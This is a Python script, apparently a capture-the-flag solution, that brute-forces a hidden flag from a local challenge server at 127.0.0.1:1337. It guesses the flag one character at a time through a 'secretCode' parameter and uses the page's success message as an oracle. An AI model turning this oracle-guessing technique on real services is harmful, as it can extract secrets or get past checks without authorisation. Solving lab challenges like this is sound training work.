#!/usr/bin/python3

from pwn import *
import requests
import sys
import re
import string


def run_exploit():
    # answers
    success = 'Congratulations you managed to stop the rebelion!'
    wrong = 'Did you really think you could stop us?'
    VALUES = string.ascii_lowercase+string.ascii_uppercase+string.punctuation+"0123456789"
    VALUES = [x for x in VALUES]
    VALUES.remove("*")
    VALUES.remove(".")
    VALUES.remove("+")
    VALUES.remove("?")
    VALUES.remove("|")
    secret_code = 'H'

    try:
        p = log.progress("Brute forcing ExpressionalRebelion")
        sess = requests.session()
        while True:
            p.status(f"the flag: {secret_code}")
            for x in VALUES:
                params = {
                    "secretCode":secret_code+x
                }
                ress = sess.get(url="http://127.0.0.1:1337/deactivate", params=params)
                
                values = re.findall(r'role="alert">\s\t\t\t(.*)', ress.text)

                if success == values[0]:
                    secret_code += x
                    break
                if secret_code.endswith('}'):
                    return secret_code
    except Exception as e:
        print(str(e))
        exit(1)
    except KeyboardInterrupt:
        exit(0)


if __name__ == "__main__":
    print(run_exploit())


